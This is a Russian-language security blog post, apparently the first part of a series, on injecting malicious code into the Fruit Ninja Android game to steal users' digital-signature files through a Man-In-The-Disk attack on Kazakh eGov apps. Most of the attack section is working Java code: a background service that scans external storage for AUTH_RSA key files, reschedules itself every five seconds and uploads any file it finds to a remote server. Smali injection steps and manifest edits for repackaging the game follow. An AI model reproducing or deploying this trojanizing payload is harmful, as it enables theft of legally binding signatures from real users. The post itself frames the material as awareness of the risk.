![image](/assets/images/main_logo.png)

# About
  Данный текст разделен на три части. Они не связанны между собой, за исключением того, что все они относятся к андроид приложениям.
  
  Часть 0 -  я расскажу, как можно модифицировать популярную игру для андроида, внедрив свой вредоносный код и использовать это, для Man-In-The-Disk атаки на приложение ЕГОВ/ЕНПФ.
  
  Часть 1 - мы обойдем SSL Pinning на примере приложения mEgov и GetContact.

  Часть 2 - мы поищем фотки ваших друзей по номеру телефона.
  
  Часть 3 - кейлоггер
  
# Часть 0. Заражаем андроид приложение

## Intro

  Допустим, вы используете на своем андроид телефоне приложения, которые используют ЭЦП, для получения различных услуг. С помощью нее, вы совершаете операции, которые имеют юридическую силу. Вы бы не хотели, чтобы кто-то еще имел доступ к вашей ЭЦП и пользовался ей вместо вас. Представьте, что в один прекрасный день, вы узнаете о том, что кто-то все же воспользовался ею. Вы задаетесь вопросом - как это могло произойти? Анализируете все свои последние действия. Свой телефон в руки никому не давали и нигде не оставляли/забывали. Никаких мутных программ на телефон не ставили.

  Ответ простой - вы скачали безобидное приложение, которое было модифицировано злоумышленником. Или же ваш ребенок, который иногда берет ваш телефон, установил какую-нибудь игру. 
  
  Цель - показать, как просто злоумышленник может модифицировать любое приложение, внедрив туда вредоносный код. И как важно относится к разрешениям, которые вы даете приложениям на телефоне.
  
  Внедрить можно любой функционал - запись с микрофона, фото с камеры, получение контактов/смс/паролей от бразуера и т.д. Мы будем внедрять код, который сканирует память телефона, ищет ЭЦП и отсылает на сервер. Для убедительности, внедряться будем в популярное приложение [Fruit Ninja](https://play.google.com/store/apps/details?id=com.halfbrick.fruitninjafree) (более 100 млн. скачиваний). В начале разберемся, как в теории, наше вредоносное приложение можно доставить пользователю.
  
## Как вредоносные приложения попадают на телефон
 
### Локальные маркеты приложений Китая, Ирана и т.д
 
  Примеры: cafebazaar.ir, android.myapp.com, apkplz.net
  
  Данные площадки появились вследствии цензуры и блокировки Google сервисов. Обычно они содержат местные аналоги популярных приложений и их модификации. Такие модификации содержат якобы новые, крутые фичи, как [этот](https://apkplz.net/app/org.ir.talaeii) иранский телеграм. Однажды, я изучал одну иранскую малварь ([результат Virustotal](https://www.virustotal.com/gui/file/1e6a821f5de824b91c6676742a521a8dcdd345f25a820befa11e5975fc8c39d3/community)), которая сканила телефон на наличие приложений-клонов телеграма и делала нехорошие вещи. Список был следующим, что говорит о реальной популярности всех этих клонов (скачать приложение можете [тут](/assets/files/iranian_apk_infected.zip), пароль:infected):
  
  ```
  "com.hanista.mobogram"
  "org.ir.talaeii"
  "ir.hotgram.mobile.android"
  "ir.avageram.com"
  "org.thunderdog.challegram"
  "ir.persianfox.messenger"
  "com.telegram.hame.mohamad"
  "com.luxturtelegram.black"
  "com.talla.tgr"
  "com.mehrdad.blacktelegram"
  ```
 Сколько телеграмов видите в Top downloads? ([Источник](https://cafebazaar.ir))
  
  ![image](/assets/images/iran_telegrams.png)
  
  Чем плохи модификации популярных приложений? Вы никогда не знаете, что они на самом деле делают. К тому же, правительство не упускает возможность и публикуют свои модификации, естественно с инструментами для слежения за пользователем. Приложения с правительственной слежкой являются вредоносными по определению. [Здесь](https://cybershafarat.com/2016/01/20/farsitelegram/) можете почитать, как спалились иранские власти. Цитата оттуда:
  
> This looks to be developed to the specifications of the Iranian government enabling them to track every bit and byte put forward by users of the app.  
  
  А [Здесь](https://thehackernews.com/2016/11/hacking-android-smartphone.html) спалились китайцы. Цитата:
  
> Besides sniffing SMS message content, contact lists, call logs, location data and other personal user information and automatically sending them to AdUps every 72 hours, AdUps' software also has the capability to remotely install and update applications on a smartphone.
  
  Обычным пользователям защититься от такого практически невозможно, так как другого выбора нет - официальные источники усиленно блокируются, либо приложения предустанавливаются на все ввозимые телефоны. 
  
  И не сказать, что такие маркеты непопулярны, как вам 260 000 000 пользователей в месяц? ([Источник](https://www.appinchina.co/market/app-stores/))
  
  ![image](/assets/images/china_app_stores.png)
  
### Фишинг
Классический фишинг, только вместо загрузки непонятных скриптов или файлов, пользователю предлагают обновить WhatsApp, установить новый улучшенный Instagram, установить антивирус и т.д. Примеры:

![img](/assets/images/whatsapp_fishing.png)

[Источник](https://xakep.ru/2017/01/27/mobile-phishing/)

![img](/assets/images/fishing_2.jpg)

[Источник](https://android.stackexchange.com/questions/106899/what-should-i-do-about-this-pop-up-on-my-android-device)

> I then open CHROME BROWSER and type: www.XXXXXXXX.com - within a few seconds I get a popup with this: 

![img](/assets/images/fishing_3.png)

[Источник](https://www.bleepingcomputer.com/forums/t/576156/android-pop-uphijacker/)

### Телеграм боты/группы

Пример: @apkdl_bot, t.me/fun_android

  Вместо легитимного приложения, вам могут подсунуть вредоносное. Либо заразить запрашиваемое вами приложение "на лету". Работает это так - вы вводите команду боту/в группу, что хотите скачать "Instagram". Скрипт на другой стороне скачивает его с Google Play, распаковывает, запихивает свой вредоносный код, запаковывает обратно и возвращает вам. Как это делать автоматически, я попытаюсь рассказать в ближайшем будущем.

### Сторонние сайты-посредники
 
 Пример: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/
 
 Тоже самое, что и с телеграм ботами/группами, только добавляется возможность загрузить свое приложение на такой сайт. Это в свою очередь только увеличивает вероятность установить вредоносное приложение. Пример загрузки на [этом сайте](https://www.apkmirror.com/#uploadAPK):
 
 ![img](/assets/images/apkmirror_submit.png)
   
  Один из примеров малвари, которая распостранялась таким образом ([Источник](https://www.cmcm.com/blog/en/security/2015-09-18/799.html)):
  
  ![img](/assets/images/how_ghost_push_work.jpg)
  
  Примерную статистику, для неофициальных источников, можно найти в [Android Security Report 2018](https://source.android.com/security/reports/Google_Android_Security_2018_Report_Final.pdf) - 1.6 миллиардов заблокированных Google Play Protect установок не из Google Play. Всего установок было гораздо больше.
  
### Google play
 
 Официальный источник приложений имеет защиту от подозрительных приложений, под названием Google Play Protect, которая использует машинное обучение для определения степени вредоносности. Но такая защита не в состоянии точно понять, какое приложение вредоносное, а какое нет, так как для этого требуется полная ручная проверка. Чем отличается шпионское приложение, которое мониторит все ваши передвижения, от фитнес приложения для бега? Исследователи каждый месяц [находят](https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/) [сотнями](https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/) [зараженные](https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23) приложения, опубликованные в Google Play.
  
  Обычно малварь называет себя *google play services* или схожим образом и ([ставит такую же иконку](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone)) . Почему гугл плей не проверяет иконку на схожесть со своими официальными приложениями - непонятно. Однажды в телеграме, я поставил аватарку с бумажным самолетиком и меня заблокировали. Еще один способ, используемый для публикации в Google Play, состоит в создании схожего имени, с заменой буквы "L" на "I", "g" на "q" и т.д:
  
  
  ![image](/assets/images/spoil_name.png) 
  
  [Источник](https://ti.360.net/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group-en/). 
  
  Тем самым, вы по ошибке можете скачать не то приложение, которое хотели и оно в свою очередь, сворует все ваши контакты и поставит еще много чего вам на телефон. 

### Другие способы

1. [Установка малвари в сервисах починки телефонов](https://www.thesun.co.uk/tech/4298260/smartphone-screen-repair-shops-could-let-spies-into-your-phone/)

2. [При пересечении границы](https://www.theguardian.com/world/2019/jul/02/chinese-border-guards-surveillance-app-tourists-phones)

3. Подключение к незнакомому компьютеру по USB, с включенным режимом отладки. 

4. Получение злоумышленником доступа к вашему гугл аккаунту, и установка приложения на телефон через Google Play. 

### Вывод

Теперь мы поняли, что наше зараженное приложение может попасть на телефон пользователя множеством способов. Теперь о способе атаки, для получения ЭЦП. 

### Man-In-The-Disk

Проблема стара как мир. Общественность обратила на нее внимание, после этой [статьи](https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/). Советую, для начала, ее прочитать.

*Для тех кто прочитал статью выше. В исследовании не развили мысль о том, что эти файлы обрабатываются простыми библиотеками, в которых можно найти уязвимость и скрафтить такие файлы, которые ее проэксплуатируют.*

Кто не прочитал, расскажу в кратце. Для начала, определимся с понятиями. В андроиде память разделяется на Internal Storage и External Storage. Internal storage - это внутренняя память приложения, доступная только ему и никому больше. Абсолютно каждому приложению на телефоне соответствует отдельный пользователь и отдельная папка с правами только для этого пользователя. Это отличный защитный механизм. External storage - основная память телефона, доступная всем приложениям (сюда же относится SD карта). Зачем она нужна? Возьмем приложение фоторедактор. После редактирования, вы должны сохранить фото, чтобы оно было доступно из галереи. Естественно, что если вы положите его в internal storage, то никому, кроме вашего приложения оно доступно не будет. Или бразуер, который скачивает все файлы в общую папку Downloads.

У каждого андроид приложения есть свой набор разрешений, которые оно запрашивает. Но с ними все не так хорошо. Среди них есть такие, на которые люди охотно закрывают глаза и не относятся серъезно. Среди них - READ_EXTERNAL_STORAGE. Оно позволяет приложению получать доступ к основной памяти телефона, а значит и ко всем данным других приложений. Никто ведь не удивиться, если приложение "блокнот" запросит данное разрешение. Мало ли, вдруг оно там настройки хранит и кэш. Манипуляция данными других приложений в external storage и есть атака Man-In-The-Disk. Другое, почти дефолтное, разрешение - INTERNET. Как видно из названия, оно позволяет приложению иметь доступ в сеть. Самое печальное, что пользователю не показывается специальное окно с просьбой дать это разрешение. Вы просто прописываете его в своем приложении и всё. Именно два этих разрешения нужны для проведения нашей атаки.

Я скачал топ-15 казахстанских приложений и написал [скрипт](https://github.com/OrderOfSixAngles/Android-permissions-chart), который выводит статистику запрашиваемых разрешений. Как видите, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE и INTERNET очень популярны. Значит мы можем  менее болезнено встраивать наш код в большинство приложений.

<details>
  <summary>Список протестированных приложений</summary>
  1. 2-GIS
	
  2. AliExpress
  
3. Chocofood

	4. Chrome
	
	5. InDriver
	
	6. Instagram
	
	7. Kaspi
	
	8. Kolesa
	
	9. Krisha
	
	10. Telegram
	
	11. VK
	
	12. WhatsApp
	
	13. Yandex Music
	
	14. Yandex Taxi
	
	15. Zakon KZ
</details>

![top-15-apps](/assets/images/permissions.png)

  Небольшое отступление - если поставить whatsapp на рутованый телефон, то все ваши переписки хранятся в external storage незашифрованными. Видимо whatsapp не считает нужным даже использовать шифрование, на таком "порченом" телефоне. А на нерутованом, там лежит SSLSessionCache и переписки в зашифрованном виде, которые без труда можно расшифровать. Грубо говоря, практически любое приложение имеет доступ ко всем ваших сообщениям WhatsApp.   

Google в курсе проблемы и [собирается изменить](https://developer.android.com/preview/privacy/scoped-storage?hl=ru) READ_EXTERNAL_STORAGE в Android Q. Цитата:

> In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. 

Теперь мы решили все вопросы с доставкой нашего зараженного приложения и то, какой вектор оно будет эксплуатировать. 

## Создаем payload

Напомню: нам необходимо заразить игру Ninja Fruit своим кодом, который будет сканировать external storage, искать там ЭЦП и отсылать на сервер. Для этого, в начале, нам надо написать сам сканер. 

Он состоит из трех основных классов: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```.

![img](assets\images\sign_scan\prj_struct.png)

```StageAttack``` - состоит из одного статического метода, который начинает нашу атаку. Мы специально создаем переходный статический метод, для удобства внедрения в готовый класс.

{% highlight java %}
public class StageAttack {

    public static void pwn(Context ctx) {
        Log.d("MalService", "Staging our attack...");
        Intent intent = new Intent(ctx,  MaliciousService.class);
        ctx.startService(intent);
    }
}

{% endhighlight %}

```MaliciousService``` - рекурсивно осуществляет поиск по всему external storage. Является андроид сервисом, что позволяет ему работать, даже если приложение закрыто. 

{% highlight java %}
private String pwn2(File dir) {

        String path = null;
        try {

            File[] list = dir.listFiles();

            if (list == null) {
                Log.d(TAG, "list is null!");
                return null;
            }

            for (File f : list) {

                if (!containsSymlink(f)) {

                    if (f.isDirectory()) {
                        path = pwn2(f);
                        if (path != null)
                            return path;
                    } else {
                        path = f.getAbsolutePath();
                        if (path.contains("AUTH_RSA")) {
                            Log.d(TAG, "AUTH_RSA found here - " + path);
                            return path;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
        return null;
    }
{% endhighlight %}

Если ЭЦП не найдено, мы будем повторять поиск каждые 5 секунд, пока не найдем. Интервал можно использовать любой. Взяв слишком маленький интервал, наш сервис рискует быть остановленным системой. Почему рискует? Потому что, чем ниже версия андроида, тем слабее и гуманнее политика в отношении работы фоновых процессов. Foreground service мы тоже не можем использовать, так как для этого постоянно должно висеть уведомление. Не являясь андроид разработчиком, я потратил кучу времени, чтобы найти способ запланировать задачу, которая будет выполняться точно в срок. Это не так просто, как кажется. В андроиде есть несколько рекомендуемых для этого способов (JobService, WorkManager, setRepeating() AlarmManager'а). В документации неочевидно указано, что интервал задачи должен быть не менее 15 минут и время ее выполнения зависит от желания системы. Нас это не устраивает, поэтому мы используем класс ```AlarmManager```, метод ```setExactAndAllowWhileIdle()```. Когда задача выполниться, снова ее планируем, с таким же интервалом. Это единственный на данный момент способ известный мне, имеющий самую высокую точность.

{% highlight java %}
private void scheduleMalService() {

        Context ctx = getApplicationContext();
        AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(ctx, MaliciousTaskManager.class);

        final int _id = (int) System.currentTimeMillis();
        PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, 0);

        alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() +
                5000, alarmIntent);
    }
{% endhighlight %}

Если ЭЦП найдено, то мы отправляем файл на сервер:

{% highlight java %}
private void sendToServer(String path) {
        Log.d(TAG, "Sending p12 file to server");
        try {
            File file = new File(path);
            URL url = new URL("http://xxxxxxxxxx");
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(30 * 1000);

            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/octet-stream");

            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
            request.write(readFileToByteArray(file));
            request.flush();
            request.close();

            int respCode = urlConnection.getResponseCode();
            Log.d(TAG, "Return status code: " + respCode);

        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }
{% endhighlight %}

## Внедряем payload

Первым делом декомпилируем Fruit Ninja, с помощью ```apktool```. Внимание! Мы не можем декомпилировать приложение до java кода, так как после модификации, мы не сможем собрать его обратно. Нам необходимо получить именно smali классы. И внедрять наш код мы тоже будем в виде smali кода. 

<details>
  <summary>Что такое smali код?</summary>
	Андроид приложения компилируются в байткод, который исполняется виртуальной машиной Dalvik. Сам байткод тяжело читаем, поэтому его удобочитаемая для человека форма, называется smali. smali - это аналог языка ассемблера, но для андроида. 
</details>

Далее, если мы хотим, чтобы наш payload запустился при старте приложения, мы должны модифицировать входную точку. Входной точкой любого GUI приложения является класс-потомок Activity, который принимает ACTION_MAIN. Открываем папку с декомпилированным приложением, и находим его в файле AndroidManifest.xml:

{% highlight xml %}
<activity android:name="com.halfbrick.mortar.MortarGameLauncherActivity">
	<intent-filter>
		<action android:name="android.intent.action.MAIN"/>
		<category android:name="android.intent.category.LAUNCHER"/>
	</intent-filter>
</activity>
{% endhighlight %}

Мы нашли нужный нам класс ```com.halfbrick.mortar.MortarGameLauncherActivity```. Перед тем, как изучить его, посмотрим на жизненный цикл Activity, это нам пригодится. 

![activity life cycle]("/assets/images/activity_lifecycle.png")

[Источник](https://developer.android.com/reference/android/app/Activity)

Открываем Activity, у меня он лежит по пути "base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali". Если вы до этого не видели smali код, это не страшно, он достаточно прост для **чтения** и логически понятен.

```java
.class public Lcom/halfbrick/mortar/MortarGameLauncherActivity;
// Имя класса и его package

.super Landroid/app/Activity;
//.super указывает от какого класса наследуемся. Все Activity должны наследоваться от android.app.Activity.

.source "MortarGameLauncherActivity.java"
// Исходный Java файл.

.method public constructor <init>()V
/* Ключевые слова говорят сами за себя - это конструктор класса. Самая последняя буква, в определении метода, в smali, является 
типом возвращаемого значения. В данном случае, V - void */

    .locals 0
/* Виртуальная машина Dalvik не использует стек, вместо этого используются регистры. Регистры это просто ячейки, которые
могут хранить любые типы данных. Каждая функция имеет свой личный набор регистров. Через них передаются параметры вызываемым функциям. 
В зависимости от инструкции, доступных регистров может быть 16, 256 или 64К. Регистры делятся на локальные регистры и регистры, для аргументов. В локальные регистры можно класть локальные переменные. В регистры для аргументов, кладут входные параметры функций. .locals 0 - означает, что в методе 0 локальных регистров. К локальным регистрам обращаются, как v0, v1, v2, v3, ... В аргументным регистрам - p0, p1, p2, p3. 
*/

    .line 28
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
/* invoke-подобные инструкции  используются для вызова функций. invoke-direct - вызов нестатической функции, которую нельзя переопределить. Функции, которые нельзя переопределить в java - private и конструкторы. Если функцию можно переопределить, то соответственно будет произведен поиск по таблице, содержащей переопределенния метода.  В квадратных скобках указываются входные параметры функции. p0 - по умолчанию означает this в java. init говорит о том, что здесь вызывается родительский конструктор.
*/
    return-void
// ничего не возвращаем
.end method
// истиное лицо закрывающей скобки

.method protected onStart()V
    .locals 2
    
    .line 33
    invoke-super {p0}, Landroid/app/Activity;->onStart()V
// Вызываем onStart() родительского класса

    .line 35
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->isTaskRoot()Z
/* invoke-virtual - вызов виртуального метода. Виртуальный метод может быть переопределен, а значит не является static, private, final или конструктором. Класс MortarGameLauncherActivity не имеет метода isTaskRoot(), а значит он вызывается в родительском классе Activity. p0 тут опять же, является аналогом this. Последняя буква, как мы уже знаем это тип возвращаемого значения. В данном случае Z - boolean */

    move-result v0
/* Кладем результат функции isTaskRoot() в регистр v0. isTaskRoot() возвращает true, если данное Activity является первым, которое открывается при запуске приложения */

    if-nez v0, :cond_0
// Если v0 = true, то переходим по метке cond_0 (аналог goto). Если v0 = false, продолжаем выполнение 

    .line 37
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->finish()V
// finish() закрывает Activity

    return-void

    .line 41
    :cond_0
    new-instance v0, Landroid/content/Intent;
// Создаем объект Intent и кладем ссылку на него в регистра v0

    const-class v1, Lcom/halfbrick/mortar/MortarGameActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 42
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->finish()V

    .line 43
    invoke-virtual {p0, v0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
```

Выяснили, что открывается MortarGameActivity. Открываем его. Смотрим метод ```Oncreate```, так как с него начинается любое активити.
Куда-то сюда нам надо вставить вызов нашего кода. Вставлять надо так, чтобы сохранить порядок line. Стрелочкой показано, куда будем вставлять

```smali
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    :try_start_0
    const-string v0, "android.os.AsyncTask"

    .line 465
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 471
    :catch_0
    invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V
    
	  <------------------------------------------- вставлять будем сюда, как строку 472
    
    .line 473
    invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;->TryLoadGameLibrary()Z

    .line 475
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landroid/content/Intent;
```

Куда вставлять нашли, теперь нужен smali код того, что хотим вставить. Собираем в apk наш сканер и декомпилируем. Переносим наши три класса в папку com/halfbrick/mortar (там же, где лежит активити целевая). Меняем им package name с kz.c.signscan на com.halfbrick.mortar. 

(Вставить много красивых картинок! Типа, какой был код и какой стал)

В smali классе MainActivity берем строчку вызова StageAttack->pwn(). Копируем ее и вставляем в MortarGameActivity, в то место, которое мы определили. Добавляем в manifest наш ресивер и сервис.
```
<receiver android:name=".MaliciousTaskManager"/>
<service android:name=".MaliciousService"/>
```

Запаковываем все обратно и подписываем (тут со стековерфлоу взять команды и написать че к чему). И видеодемонстрация!
[Здесь исходники](https://github.com/OrderOfSixAngles/ExternalStorageStealer)
